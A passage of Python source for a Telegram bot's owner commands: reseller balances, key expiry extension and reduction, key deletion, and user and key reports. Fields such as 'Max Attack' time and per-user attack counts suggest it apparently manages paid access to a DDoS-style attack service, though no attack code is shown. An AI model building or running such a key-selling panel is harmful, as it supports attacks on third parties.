    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐁𝐚𝐥𝐚𝐧𝐜𝐞 𝐑𝐞𝐦𝐨𝐯𝐞𝐝!</b>\n\n{HTML_EMOJI.PROFILE} 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫: {display}\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {reseller_id}\n{HTML_EMOJI.CROSS} 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: {amount} 𝐑𝐬\n{HTML_EMOJI.CREDIT} 𝐍𝐞𝐰 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {new_balance} 𝐑𝐬", reply_to=message)


@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/saldo &lt;id or @username&gt;</code>", reply_to=message)
        return

    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.MONEY} <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐁𝐚𝐥𝐚𝐧𝐜𝐞</b>\n\n{HTML_EMOJI.PROFILE} 𝐔𝐬𝐞𝐫: {display}\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {reseller_id}\n{HTML_EMOJI.CREDIT} 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {reseller.get('balance', 0)} 𝐑𝐬\n{HTML_EMOJI.KEY} 𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬: {reseller.get('total_keys_generated', 0)}\n{HTML_EMOJI.STATS} 𝐒𝐭𝐚𝐭𝐮𝐬: {'🚫 𝐁𝐥𝐨𝐜𝐤𝐞𝐝' if reseller.get('blocked') else '✅ 𝐀𝐜𝐭𝐢𝐯𝐞'}", reply_to=message)


@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id

    reseller = get_reseller(user_id)
    if not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫!</b>", reply_to=message)
        return

    if reseller.get('blocked'):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝐘𝐨𝐮𝐫 𝐩𝐚𝐧𝐞𝐥 𝐢𝐬 𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b>", reply_to=message)
        return

    safe_send_message(message.chat.id, f"{HTML_EMOJI.MONEY} <b>𝐘𝐨𝐮𝐫 𝐁𝐚𝐥𝐚𝐧𝐜𝐞</b>\n\n{HTML_EMOJI.CREDIT} 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {reseller.get('balance', 0)} 𝐑𝐬\n{HTML_EMOJI.KEY} 𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝: {reseller.get('total_keys_generated', 0)}\n\n{HTML_EMOJI.DOCUMENT} 𝐔𝐬𝐞 /prices 𝐭𝐨 𝐬𝐞𝐞 𝐤𝐞𝐲 𝐩𝐫𝐢𝐜𝐞𝐬\n{HTML_EMOJI.KEY} 𝐔𝐬𝐞 /gen 𝐭𝐨 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐤𝐞𝐲𝐬", reply_to=message)


# ============ EXTEND / DOWN / KEY MANAGEMENT ============

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/extend &lt;id or @username&gt; &lt;time&gt;</code>", reply_to=message)
        return

    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)

    if not duration:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧!</b>", reply_to=message)
        return

    user = users_collection.find_one({'user_id': target_user_id})

    if not user:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐤𝐞𝐲 𝐝𝐚𝐭𝐚𝐛𝐚𝐬𝐞!</b>", reply_to=message)
        return

    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
    else:
        new_expiry = datetime.now() + duration

    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'key_expiry': new_expiry}}
    )

    new_remaining = format_timedelta(new_expiry - datetime.now())

    try:
        if bot:
            bot.send_message(target_user_id, f"{HTML_EMOJI.PARTY} <b>𝐓𝐢𝐦𝐞 𝐄𝐱𝐭𝐞𝐧𝐝𝐞𝐝!</b>\n\n{HTML_EMOJI.TIMER} 𝐀𝐝𝐝𝐞𝐝: {duration_label}\n{HTML_EMOJI.TIMER} 𝐓𝐨𝐭𝐚𝐥 𝐓𝐢𝐦𝐞: {new_remaining}\n\n𝐄𝐧𝐣𝐨𝐲!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        pass

    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐓𝐢𝐦𝐞 𝐄𝐱𝐭𝐞𝐧𝐝𝐞𝐝!</b>\n\n{HTML_EMOJI.PROFILE} 𝐔𝐬𝐞𝐫: {display}\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {target_user_id}\n{HTML_EMOJI.TIMER} 𝐀𝐝𝐝𝐞𝐝: {duration_label}\n{HTML_EMOJI.TIMER} 𝐍𝐞𝐰 𝐓𝐢𝐦𝐞: {new_remaining}", reply_to=message)


@bot.message_handler(commands=["extendall"])
def extend_all_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/extendall &lt;time&gt;</code>", reply_to=message)
        return

    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)

    if not duration:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧!</b>", reply_to=message)
        return

    all_users = list(users_collection.find({'key': {'$ne': None}}))

    if not all_users:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐰𝐢𝐭𝐡 𝐤𝐞𝐲𝐬 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    extended_count = 0
    notified_count = 0

    for user in all_users:
        uid = user['user_id']
        old_expiry = user.get('key_expiry')

        if old_expiry and old_expiry > datetime.now():
            new_expiry = old_expiry + duration
        else:
            new_expiry = datetime.now() + duration

        users_collection.update_one(
            {'user_id': uid},
            {'$set': {'key_expiry': new_expiry}}
        )
        extended_count += 1

        try:
            if bot:
                bot.send_message(uid, f"{HTML_EMOJI.PARTY} <b>𝐓𝐢𝐦𝐞 𝐄𝐱𝐭𝐞𝐧𝐝𝐞𝐝 𝐟𝐨𝐫 𝐀𝐋𝐋 𝐔𝐬𝐞𝐫𝐬!</b>\n\n{HTML_EMOJI.TIMER} 𝐀𝐝𝐝𝐞𝐝: {duration_label}\n\n𝐄𝐧𝐣𝐨𝐲!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
                notified_count += 1
        except:
            pass

    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐃𝐨𝐧𝐞! 𝐄𝐯𝐞𝐫𝐲𝐨𝐧𝐞'𝐬 𝐭𝐢𝐦𝐞 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐞𝐱𝐭𝐞𝐧𝐝𝐞𝐝.</b>\n\n{HTML_EMOJI.PROFILE} 𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬: {extended_count}\n{HTML_EMOJI.DOCUMENT} 𝐍𝐨𝐭𝐢𝐟𝐢𝐞𝐝: {notified_count}\n{HTML_EMOJI.TIMER} 𝐀𝐝𝐝𝐞𝐝: {duration_label}", reply_to=message)


@bot.message_handler(commands=["down"])
def down_key_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/down &lt;id or @username&gt; &lt;time&gt;</code>", reply_to=message)
        return

    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)

    if not duration:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧!</b>", reply_to=message)
        return

    user = users_collection.find_one({'user_id': target_user_id})

    if not user:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐤𝐞𝐲 𝐝𝐚𝐭𝐚𝐛𝐚𝐬𝐞!</b>", reply_to=message)
        return

    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐔𝐬𝐞𝐫 𝐝𝐨𝐞𝐬 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 𝐚𝐧 𝐚𝐜𝐭𝐢𝐯𝐞 𝐤𝐞𝐲!</b>", reply_to=message)
        return

    new_expiry = user['key_expiry'] - duration
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)

    if new_expiry <= datetime.now():
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key': None, 'key_expiry': None}}
        )
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} <b>𝐊𝐞𝐲 𝐄𝐱𝐩𝐢𝐫𝐞𝐝!</b>\n\n{HTML_EMOJI.PROFILE} 𝐔𝐬𝐞𝐫: {display}\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {target_user_id}\n{HTML_EMOJI.CROSS} 𝐊𝐞𝐲 𝐫𝐞𝐦𝐨𝐯𝐞𝐝!", reply_to=message)
    else:
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key_expiry': new_expiry}}
        )
        new_remaining = format_timedelta(new_expiry - datetime.now())
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐓𝐢𝐦𝐞 𝐑𝐞𝐝𝐮𝐜𝐞𝐝!</b>\n\n{HTML_EMOJI.PROFILE} 𝐔𝐬𝐞𝐫: {display}\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {target_user_id}\n{HTML_EMOJI.TIMER} 𝐑𝐞𝐝𝐮𝐜𝐞𝐝: {duration_label}\n{HTML_EMOJI.TIMER} 𝐍𝐞𝐰 𝐓𝐢𝐦𝐞: {new_remaining}", reply_to=message)


@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/delkey &lt;key&gt;</code>", reply_to=message)
        return

    key_input = command_parts[1]

    result = keys_collection.delete_one({'key': key_input})

    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐊𝐞𝐲 <code>{key_input}</code> 𝐝𝐞𝐥𝐞𝐭𝐞𝐝!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐊𝐞𝐲 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)


@bot.message_handler(commands=["key"])
def key_details_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/key &lt;key&gt;</code>", reply_to=message)
        return

    key_input = command_parts[1]

    key_doc = keys_collection.find_one({'key': key_input})

    if not key_doc:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐊𝐞𝐲 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.KEY} 𝐊𝐄𝐘 𝐃𝐄𝐓𝐀𝐈𝐋𝐒\n"
    response += "═══════════════════════════\n\n"

    response += f"{HTML_EMOJI.KEY} 𝐊𝐞𝐲: {key_input}\n"
    response += f"{HTML_EMOJI.TIMER} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {key_doc.get('duration_label', 'Unknown')}\n"
    response += f"{HTML_EMOJI.TIMER} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬: {key_doc.get('duration_seconds', 0)}\n"
    response += f"{HTML_EMOJI.CALENDAR} 𝐂𝐫𝐞𝐚𝐭𝐞𝐝: {key_doc.get('created_at', 'Unknown')}\n"

    creator_type = key_doc.get('created_by_type', 'owner')
    if creator_type == 'reseller':
        creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
        response += f"{HTML_EMOJI.PROFILE} 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: {creator} (𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫)\n"
    else:
        response += f"{HTML_EMOJI.PROFILE} 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: 𝐎𝐖𝐍𝐄𝐑\n"

    response += f"\n{HTML_EMOJI.STATS} 𝐒𝐭𝐚𝐭𝐮𝐬: {'🔴 𝐔𝐒𝐄𝐃' if key_doc.get('used') else '🟢 𝐔𝐍𝐔𝐒𝐄𝐃'}\n"
    response += f"{HTML_EMOJI.STAR} 𝐓𝐲𝐩𝐞: {key_doc.get('key_type', 'NORMAL')}\n"
    response += f"{HTML_EMOJI.FIRE} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤: {key_doc.get('max_attack_time', 300)}s\n"

    if key_doc.get('used'):
        response += f"{HTML_EMOJI.PROFILE} 𝐔𝐬𝐞𝐝 𝐁𝐲: {key_doc.get('used_by', 'Unknown')}\n"
        response += f"{HTML_EMOJI.CALENDAR} 𝐔𝐬𝐞𝐝 𝐀𝐭: {key_doc.get('used_at', 'Unknown')}\n"

        user = users_collection.find_one({'key': key_input})
        if user:
            response += f"\n─── 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎 ───\n"
            response += f"{HTML_EMOJI.PROFILE} 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {user.get('username', 'Unknown')}\n"
            response += f"{HTML_EMOJI.PROFILE} 𝐔𝐬𝐞𝐫 𝐈𝐃: {user.get('user_id', 'Unknown')}\n"

            expiry = user.get('key_expiry')
            if expiry:
                if expiry > datetime.now():
                    remaining = format_timedelta(expiry - datetime.now())
                    response += f"{HTML_EMOJI.TIMER} 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: {remaining}\n"
                    response += f"{HTML_EMOJI.CHECKMARK} 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐂𝐓𝐈𝐕𝐄\n"
                else:
                    response += f"{HTML_EMOJI.CROSS} 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐄𝐗𝐏𝐈𝐑𝐄𝐃\n"

    response += "\n═══════════════════════════"

    safe_send_message(message.chat.id, response, reply_to=message)


@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    unused_keys = list(keys_collection.find({'used': False}))
    used_keys = list(keys_collection.find({'used': True}).sort('used_at', -1))

    content = "═══════════════════════════\n"
    content += "       𝐀𝐋𝐋 𝐊𝐄𝐘𝐒 𝐑𝐄𝐏𝐎𝐑𝐓\n"
    content += f"    𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"

    content += f"𝐔𝐍𝐔𝐒𝐄𝐃 𝐊𝐄𝐘𝐒 ({len(unused_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(unused_keys, 1):
        content += f"{i}. {key['key']}\n"
        content += f"   𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {key.get('duration_label', 'N/A')}\n"
        content += f"   𝐓𝐲𝐩𝐞: {key.get('key_type', 'NORMAL')}\n"
        content += f"   𝐂𝐫𝐞𝐚𝐭𝐞𝐝: {key.get('created_at', 'N/A')}\n"
        if key.get('created_by_username'):
            content += f"   𝐁𝐲: {key.get('created_by_username')}\n"
        content += "\n"

    if not unused_keys:
        content += "   𝐍𝐨 𝐮𝐧𝐮𝐬𝐞𝐝 𝐤𝐞𝐲𝐬\n\n"

    content += f"\n𝐔𝐒𝐄𝐃 𝐊𝐄𝐘𝐒 ({len(used_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(used_keys, 1):
        content += f"{i}. {key['key']}\n"
        content += f"   𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {key.get('duration_label', 'N/A')}\n"
        content += f"   𝐓𝐲𝐩𝐞: {key.get('key_type', 'NORMAL')}\n"
        content += f"   𝐔𝐬𝐞𝐝 𝐛𝐲: {key.get('used_by', 'N/A')}\n"
        if key.get('used_at'):
            content += f"   𝐔𝐬𝐞𝐝 𝐚𝐭: {key['used_at'].strftime('%d-%m-%Y %H:%M')}\n"
        if key.get('created_by_username'):
            content += f"   𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲: {key.get('created_by_username')}\n"
        content += "\n"

    if not used_keys:
        content += "   𝐍𝐨 𝐮𝐬𝐞𝐝 𝐤𝐞𝐲𝐬\n"

    content += "\n═══════════════════════════\n"
    content += f"𝐓𝐎𝐓𝐀𝐋: {len(unused_keys)} 𝐮𝐧𝐮𝐬𝐞𝐝 | {len(used_keys)} 𝐮𝐬𝐞𝐝\n"
    content += "═══════════════════════════"

    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    if bot:
        bot.send_document(message.chat.id, file, caption=f"{HTML_EMOJI.DOCUMENT} 𝐀𝐥𝐥 𝐊𝐞𝐲𝐬 𝐑𝐞𝐩𝐨𝐫𝐭\n\n{HTML_EMOJI.CHECKMARK} 𝐔𝐧𝐮𝐬𝐞𝐝: {len(unused_keys)}\n{HTML_EMOJI.CROSS} 𝐔𝐬𝐞𝐝: {len(used_keys)}", parse_mode="HTML")


@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    all_users = list(users_collection.find({'key': {'$ne': None}}).sort('key_expiry', -1))

    if not all_users:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐟𝐨𝐮𝐧𝐝!", reply_to=message)
        return

    active_users = []
    expired_users = []

    for user in all_users:
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)

    content = "═══════════════════════════\n"
    content += "       𝐀𝐋𝐋 𝐔𝐒𝐄𝐑𝐒 𝐑𝐄𝐏𝐎𝐑𝐓\n"
    content += f"    𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"

    content += f"𝐀𝐂𝐓𝐈𝐕𝐄 𝐔𝐒𝐄𝐑𝐒 ({len(active_users)})\n"
    content += "───────────────────────────\n"

    for i, user in enumerate(active_users, 1):
        remaining = user['key_expiry'] - datetime.now()
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        time_str = f"{days}d {hours}h {minutes}m"

        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        key_type = user.get('key_type', 'NORMAL')

        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   𝐈𝐃: {user['user_id']}\n"
        content += f"   𝐊𝐞𝐲: {user.get('key', 'N/A')}\n"
        content += f"   𝐓𝐲𝐩𝐞: {key_type}\n"
        content += f"   𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {user.get('key_duration_label', 'N/A')}\n"
        content += f"   𝐓𝐢𝐦𝐞 𝐋𝐞𝐟𝐭: {time_str}\n"
        content += f"   𝐄𝐱𝐩𝐢𝐫𝐞𝐬: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: {attack_count}\n"
        if user.get('reseller_username'):
            content += f"   𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫: @{user['reseller_username']}\n"
        content += "\n"

    if not active_users:
        content += "   𝐍𝐨 𝐚𝐜𝐭𝐢𝐯𝐞 𝐮𝐬𝐞𝐫𝐬\n\n"

    content += f"\n𝐄𝐗𝐏𝐈𝐑𝐄𝐃 𝐔𝐒𝐄𝐑𝐒 ({len(expired_users)})\n"
    content += "───────────────────────────\n"

    for i, user in enumerate(expired_users, 1):
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        key_type = user.get('key_type', 'NORMAL')

        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   𝐈𝐃: {user['user_id']}\n"
        content += f"   𝐊𝐞𝐲: {user.get('key', 'N/A')}\n"
        content += f"   𝐓𝐲𝐩𝐞: {key_type}\n"
        if user.get('key_expiry'):
            content += f"   𝐄𝐱𝐩𝐢𝐫𝐞𝐝: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: {attack_count}\n"
        content += "\n"

    if not expired_users:
        content += "   𝐍𝐨 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐮𝐬𝐞𝐫𝐬\n"

    content += "\n═══════════════════════════\n"
    content += f"𝐓𝐎𝐓𝐀𝐋: {len(active_users)} 𝐀𝐜𝐭𝐢𝐯𝐞 | {len(expired_users)} 𝐄𝐱𝐩𝐢𝐫𝐞𝐝\n"
    content += "═══════════════════════════"

    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    if bot:
        bot.send_document(message.chat.id, file, caption=f"{HTML_EMOJI.USERS} 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬 𝐑𝐞𝐩𝐨𝐫𝐭\n\n{HTML_EMOJI.CHECKMARK} 𝐀𝐜𝐭𝐢𝐯𝐞: {len(active_users)}\n{HTML_EMOJI.CROSS} 𝐄𝐱𝐩𝐢𝐫𝐞𝐝: {len(expired_users)}", parse_mode="HTML")


@bot.message_handler(commands=["delexpkey"])
def del_exp_key_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    all_used_keys = list(keys_collection.find({'used': True}))
    expired_keys = []

    for key in all_used_keys:
        user = users_collection.find_one({'key': key['key']})
        if user:
            if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
                expired_keys.append(key)
        else:
            expired_keys.append(key)

    if not expired_keys:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐍𝐨 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐤𝐞𝐲𝐬 𝐟𝐨𝐮𝐧𝐝!</b>", reply_to=message)
        return

    pending_del_exp_key[user_id] = expired_keys

    safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} <b>𝐅𝐨𝐮𝐧𝐝 {len(expired_keys)} 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐤𝐞𝐲𝐬!</b>\n\n𝐓𝐲𝐩𝐞 /confirm_delexpkey 𝐭𝐨 𝐜𝐨𝐧𝐟𝐢𝐫𝐦.\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐜𝐚𝐧𝐜𝐞𝐥.", reply_to=message)


@bot.message_handler(commands=["confirm_delexpkey"])
def confirm_del_exp_key_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        return

    if user_id not in pending_del_exp_key:
